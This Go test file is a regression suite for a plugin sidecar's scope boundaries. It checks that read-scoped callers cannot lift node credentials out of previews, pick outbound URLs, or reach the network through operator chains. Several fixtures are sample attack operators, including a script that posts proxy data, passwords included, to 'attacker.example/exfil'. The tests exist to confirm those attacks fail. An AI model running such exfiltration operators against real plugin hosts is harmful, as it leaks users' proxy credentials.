package main

// Scope-boundary regression suite.
//
// The sidecar never receives the caller's scopes: there is no scope field on
// the SDK request and nothing here reads one. The signed manifest's per-method
// scope is therefore the only bound in the chain, and these tests pin the two
// properties that keeps honest:
//
//  1. a method declared substore:read cannot reach the network, cannot choose
//     where the plugin sends a request, and cannot read a node credential;
//  2. the in-process table that grants network access agrees with the manifest,
//     so the next method someone adds cannot quietly land on the wrong side.
//
// Every test here failed on 537f679 before the fix, except the two controls.

import (
	"encoding/base64"
	"encoding/json"
	"os"
	"strings"
	"testing"

	latticeplugin "github.com/LatticeNet/lattice-sdk/plugin"
)

// auditNode's userinfo base64-decodes to "aes-128-gcm:supersecret", so the
// parsed proxy object carries password="supersecret".
const auditNode = "ss://YWVzLTEyOC1nY206c3VwZXJzZWNyZXQ=@node.example.com:8388#Prod"

const auditSecret = "supersecret"

// auditCall drives serveInvocation, which is the same entry point
// invocationHandler uses in production, so the network grant under test is the
// real one and not a copy of it.
func auditCall(t *testing.T, host hostCaller, service, method string, payload map[string]any) response {
	t.Helper()
	raw, err := json.Marshal(payload)
	if err != nil {
		t.Fatalf("encode payload: %v", err)
	}
	return serveInvocation(newTestEmbeddedSubStoreEngine(), host, request{
		Action:  latticeplugin.ActionCall,
		Service: pluginID + "/" + service,
		Method:  method,
		Payload: raw,
	})
}

func auditScriptOperator(t *testing.T, body string) json.RawMessage {
	t.Helper()
	raw, err := json.Marshal(map[string]any{
		"type": "Script Operator",
		"args": map[string]any{"mode": "script", "content": body},
	})
	if err != nil {
		t.Fatalf("encode operator: %v", err)
	}
	return raw
}

// FINDING 1 — a caller-supplied operator must not be able to lift a credential
// out of a preview.
//
// previewSubscription reduces every node to nodeSummary so a preview "cannot
// double as a credential dump". That reduction now runs BEFORE the operator
// chain as well as after it, so an operator never holds the secret in the first
// place. Reducing only on the way out left the chain holding whole nodes, and a
// Script Operator assigned the password to `name`, which the summary returns.
func TestPreviewRedactionHoldsAgainstACallerSuppliedOperator(t *testing.T) {
	lift := auditScriptOperator(t, `function operator(proxies) {
		return proxies.map(p => ({ ...p, name: JSON.stringify(p) }));
	}`)

	resp := auditCall(t, nil, "subscription", "preview", map[string]any{
		"raw":       auditNode,
		"target":    "URI",
		"operators": []json.RawMessage{lift},
	})
	if !resp.OK {
		t.Fatalf("preview failed: %s", resp.Error)
	}
	if strings.Contains(string(resp.Result), auditSecret) {
		t.Fatalf("a substore:read caller read a node credential out of a redacted preview: %s", resp.Result)
	}
}

// Control. The same call without an operator must stay redacted, so a failure
// above is the operator chain and not the summary quietly changing shape.
func TestPreviewWithoutOperatorsWithholdsTheCredential(t *testing.T) {
	resp := auditCall(t, nil, "subscription", "preview", map[string]any{
		"raw": auditNode, "target": "URI",
	})
	if !resp.OK {
		t.Fatalf("preview failed: %s", resp.Error)
	}
	if strings.Contains(string(resp.Result), auditSecret) {
		t.Fatalf("baseline preview leaked the credential: %s", resp.Result)
	}
}

// Control. The reduction must not cost the preview its actual job: the nodes
// still have to come back, with the fields the summary is supposed to show.
func TestPreviewStillReportsNodesAfterTheReduction(t *testing.T) {
	resp := auditCall(t, nil, "subscription", "preview", map[string]any{
		"raw": auditNode, "target": "URI",
	})
	if !resp.OK {
		t.Fatalf("preview failed: %s", resp.Error)
	}
	var out previewResult
	if err := json.Unmarshal(resp.Result, &out); err != nil {
		t.Fatalf("decode preview: %v", err)
	}
	if len(out.Nodes) != 1 || out.Nodes[0].Name != "Prod" ||
		out.Nodes[0].Type != "ss" || out.Nodes[0].Server != "node.example.com" {
		t.Fatalf("preview lost the node it exists to show: %+v", out.Nodes)
	}
}

// A filter must still filter after the reduction, or the preview answers the
// wrong question safely.
func TestPreviewOperatorsStillFilterAfterTheReduction(t *testing.T) {
	drop := auditScriptOperator(t, `function operator(proxies) {
		return proxies.filter(p => p.name !== "Prod");
	}`)
	resp := auditCall(t, nil, "subscription", "preview", map[string]any{
		"raw": auditNode, "target": "URI", "operators": []json.RawMessage{drop},
	})
	if !resp.OK {
		t.Fatalf("preview failed: %s", resp.Error)
	}
	var out previewResult
	if err := json.Unmarshal(resp.Result, &out); err != nil {
		t.Fatalf("decode preview: %v", err)
	}
	if out.SourceNodeCount != 1 || len(out.Nodes) != 0 {
		t.Fatalf("the chain no longer filters: %+v", out)
	}
}

// FINDING 2 — a read-scoped caller must not choose where the plugin sends a
// request.
//
// preview used to resolve an unsaved draft's source live from the caller's own
// url and ua, which is the http.do egress `fetch` is declared substore:admin to
// perform. That resolve now lives on preview_draft, declared substore:admin.
func TestPreviewRefusesACallerSuppliedURL(t *testing.T) {
	host := &httpKVHost{kvHostCaller: newKVHostCaller(), status: 200, body: []byte(auditNode)}

	resp := auditCall(t, host, "subscription", "preview", map[string]any{
		"source": "provider",
		"url":    "https://attacker.example/beacon?id=1",
		"ua":     "audit-chosen-agent/1.0",
		"target": "URI",
	})
	if resp.OK {
		t.Fatal("preview accepted a caller-chosen source instead of refusing it")
	}
	if !strings.Contains(resp.Error, "preview_draft") {
		t.Fatalf("the refusal does not point at the admin-scoped method: %q", resp.Error)
	}
	if host.calls != 0 {
		t.Fatalf("a substore:read caller still drove %d outbound request(s) with UA %q", host.calls, host.ua)
	}
}

// Each of the four draft fields is a way to name a destination, so each is
// refused on its own rather than only in combination.
func TestPreviewRefusesEveryDraftSourceField(t *testing.T) {
	for _, field := range []string{"source", "url", "ua", "vpn_identity"} {
		t.Run(field, func(t *testing.T) {
			host := &httpKVHost{kvHostCaller: newKVHostCaller(), status: 200, body: []byte(auditNode)}
			resp := auditCall(t, host, "subscription", "preview", map[string]any{
				field: "attacker-controlled", "target": "URI",
			})
			if resp.OK {
				t.Fatalf("preview accepted %q", field)
			}
			if host.calls != 0 {
				t.Fatalf("preview reached the host anyway for %q", field)
			}
		})
	}
}

// FINDING 3 — a read-scoped caller must not get the network through the
// operator chain.
//
// The script HTTP gateway is now attached per METHOD (script_network_policy.go)
// rather than per invocation, so convert runs its chain with no network at all.
func TestConvertDoesNotGiveAReadScopedCallerTheNetwork(t *testing.T) {
	host := &scriptHTTPHost{body: []byte("ok")}

	exfil := auditScriptOperator(t, `async function operator(proxies) {
		await $substore.http.post({
			url: "https://attacker.example/exfil",
			body: JSON.stringify(proxies),
			timeout: 5000,
		});
		return proxies;
	}`)

	resp := auditCall(t, host, "engine", "convert", map[string]any{
		"raw":       auditNode,
		"target":    "URI",
		"operators": []json.RawMessage{exfil},
	})
	_ = resp // the conversion may fail or succeed; what matters is the egress.

	seen := host.seen()
	if len(seen) == 0 {
		return
	}
	leaked := false
	for _, req := range seen {
		encoded, _ := req["body_base64"].(string)
		body, err := base64.StdEncoding.DecodeString(encoded)
		if err == nil && strings.Contains(string(body), auditSecret) {
			leaked = true
		}
	}
	t.Fatalf("a substore:read caller drove %d outbound request(s) to %v; node credentials in the body: %v",
		len(seen), seen[0]["url"], leaked)
}

// The same for the other read-scoped methods that run a caller-authored chain.
// Script Operator is not the only operator that reaches the network: Resolve
// Domain Operator with provider "Custom" takes a resolver URL in its own
// arguments and fetches it, and it is not a scripting operator. Gating on
// operator type would have missed it, so both shapes are pinned here.
func TestReadScopedMethodsGetNoNetwork(t *testing.T) {
	script := auditScriptOperator(t, `async function operator(proxies) {
		await $substore.http.get({ url: "https://attacker.example/x", timeout: 5000 });
		return proxies;
	}`)
	resolve, err := json.Marshal(map[string]any{
		"type": "Resolve Domain Operator",
		"args": map[string]any{
			"provider": "Custom",
			"type":     "IPv4",
			"url":      "https://attacker.example/dns-query",
			"filter":   "all",
		},
	})
	if err != nil {
		t.Fatalf("encode operator: %v", err)
	}

	cases := []struct {
		name, service, method string
		payload               map[string]any
	}{
		{"convert/script", "engine", "convert",
			map[string]any{"raw": auditNode, "target": "URI", "operators": []json.RawMessage{script}}},
		{"convert/resolve-domain", "engine", "convert",
			map[string]any{"raw": auditNode, "target": "URI", "operators": []json.RawMessage{resolve}}},
		{"preview/script", "subscription", "preview",
			map[string]any{"raw": auditNode, "target": "URI", "operators": []json.RawMessage{script}}},
		{"preview/resolve-domain", "subscription", "preview",
			map[string]any{"raw": auditNode, "target": "URI", "operators": []json.RawMessage{resolve}}},
		{"transform_response", "engine", "transform_response",
			map[string]any{
				"response":  map[string]any{"status": 200, "headers": map[string]any{}, "body": "x"},
				"operators": []json.RawMessage{script},
			}},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			host := &scriptHTTPHost{body: []byte("ok")}
			auditCall(t, host, tc.service, tc.method, tc.payload)
			if n := len(host.seen()); n != 0 {
				t.Fatalf("%s.%s drove %d outbound request(s) at read scope", tc.service, tc.method, n)
			}
		})
	}
}

// THE GUARD — the in-process grant table has to agree with the manifest.
//
// This is what makes the fix survive the next method. The table is the only
// thing that can enforce a scope inside this process, and the manifest is the
// only thing that enforces one outside it; if they drift, the bound is gone
// again and nothing else would notice.
func TestScriptNetworkGrantsAreAdminScopedInTheManifest(t *testing.T) {
	declared := map[string][]string{}
	for _, iface := range loadManifestInterfaces(t) {
		for _, method := range iface.Methods {
			declared[iface.Service+"."+method.Name] = method.Scopes
		}
	}

	for target := range scriptNetworkMethods {
		scopes, ok := declared[target]
		if !ok {
			t.Errorf("%s is granted script network but the manifest does not declare it", target)
			continue
		}
		admin := false
		for _, scope := range scopes {
			if scope == "substore:admin" {
				admin = true
			}
		}
		if !admin {
			t.Errorf("%s is granted script network but is declared %v, not substore:admin", target, scopes)
		}
	}

	// And the other direction: nothing declared read-only may hold the grant.
	for target, scopes := range declared {
		readOnly := len(scopes) > 0
		for _, scope := range scopes {
			if scope != "substore:read" {
				readOnly = false
			}
		}
		if readOnly && scriptNetworkMethods[target] {
			t.Errorf("%s is declared substore:read but holds the script network grant", target)
		}
	}
}

// The manifest is what the host enforces, so the split has to be in it: preview
// read-only, preview_draft admin. A future edit that relaxes preview_draft back
// to substore:read reopens the caller-chosen-destination hole, and this says so.
func TestPreviewDraftIsDeclaredAdminInTheManifest(t *testing.T) {
	want := map[string]string{"preview": "substore:read", "preview_draft": "substore:admin"}
	seen := map[string]bool{}
	for _, iface := range loadManifestInterfaces(t) {
		if iface.Service != pluginID+"/subscription" {
			continue
		}
		for _, method := range iface.Methods {
			expected, ok := want[method.Name]
			if !ok {
				continue
			}
			seen[method.Name] = true
			if len(method.Scopes) != 1 || method.Scopes[0] != expected {
				t.Errorf("%s is declared %v, want [%s]", method.Name, method.Scopes, expected)
			}
		}
	}
	for name := range want {
		if !seen[name] {
			t.Errorf("the manifest does not declare %s", name)
		}
	}
}

// Every method has to declare its scopes or the host refuses it, and a method
// that declares none would silently inherit the interface default. Checked for
// the whole surface rather than for the one method added here.
func TestEveryManifestMethodDeclaresScopes(t *testing.T) {
	for _, iface := range loadManifestInterfaces(t) {
		for _, method := range iface.Methods {
			if len(method.Scopes) == 0 {
				t.Errorf("%s/%s declares no scopes", iface.Service, method.Name)
			}
		}
	}
}

// describe reports a version to whoever reads it, and the manifest is what the
// host enforces against. vpn-core, netguard and wireguard each pin these
// together; sub-store did not, which is how its constant drifted nine alphas
// behind the signed manifest without anything failing.
func TestDescribeVersionMatchesTheManifest(t *testing.T) {
	raw, err := os.ReadFile("../manifest.json")
	if err != nil {
		t.Fatalf("read manifest: %v", err)
	}
	var m struct {
		ID      string `json:"id"`
		Version string `json:"version"`
	}
	if err := json.Unmarshal(raw, &m); err != nil {
		t.Fatalf("parse manifest: %v", err)
	}

	rt := &runtime{}
	resp := rt.handle(request{Action: latticeplugin.ActionDescribe})
	if !resp.OK {
		t.Fatalf("describe failed: %s", resp.Error)
	}
	var body struct {
		ID           string   `json:"id"`
		Version      string   `json:"version"`
		Capabilities []string `json:"capabilities"`
	}
	if err := json.Unmarshal(resp.Result, &body); err != nil {
		t.Fatalf("decode describe: %v", err)
	}
	if body.ID != m.ID {
		t.Errorf("describe id %q != manifest %q", body.ID, m.ID)
	}
	if body.Version != m.Version {
		t.Errorf("describe version %q != manifest %q", body.Version, m.Version)
	}
}


// callTarget must name exactly what handleCall will dispatch to, in both request
// shapes the SDK accepts. If the two ever disagree, the grant gets computed for
// one method while a different one runs, which is the same bug this whole change
// exists to remove, just moved one layer down.
func TestCallTargetAgreesWithDispatchAndFailsClosed(t *testing.T) {
	inline, err := json.Marshal(map[string]any{
		"service": pluginID + "/engine", "method": "convert", "payload": map[string]any{},
	})
	if err != nil {
		t.Fatalf("encode: %v", err)
	}
	cases := []struct {
		name string
		req  request
		want string
		ok   bool
	}{
		{"top-level fields", request{Action: latticeplugin.ActionCall, Service: pluginID + "/engine", Method: "convert"}, pluginID + "/engine.convert", true},
		{"payload-embedded", request{Action: latticeplugin.ActionCall, Payload: inline}, pluginID + "/engine.convert", true},
		{"describe", request{Action: latticeplugin.ActionDescribe}, "", false},
		{"health", request{Action: latticeplugin.ActionHealth}, "", false},
		{"plan", request{Action: latticeplugin.ActionPlan}, "", false},
		{"unparseable payload", request{Action: latticeplugin.ActionCall, Payload: json.RawMessage(`["x"]`)}, "", false},
		{"empty payload", request{Action: latticeplugin.ActionCall}, "", false},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got, ok := callTarget(tc.req)
			if ok != tc.ok || got != tc.want {
				t.Fatalf("callTarget = %q,%v want %q,%v", got, ok, tc.want, tc.ok)
			}
			if scriptNetworkAllowed(tc.req) && !scriptNetworkMethods[got] {
				t.Fatal("granted network for a target that is not in the table")
			}
		})
	}
}

// Nothing outside a call can hold the grant: describe, health and plan run no
// caller-authored chain and must not open a socket by accident.
func TestNonCallActionsGetNoNetwork(t *testing.T) {
	for _, action := range []string{latticeplugin.ActionDescribe, latticeplugin.ActionHealth, latticeplugin.ActionPlan, "execute", "anything"} {
		if scriptNetworkAllowed(request{Action: action}) {
			t.Errorf("action %q was granted script network", action)
		}
	}
}
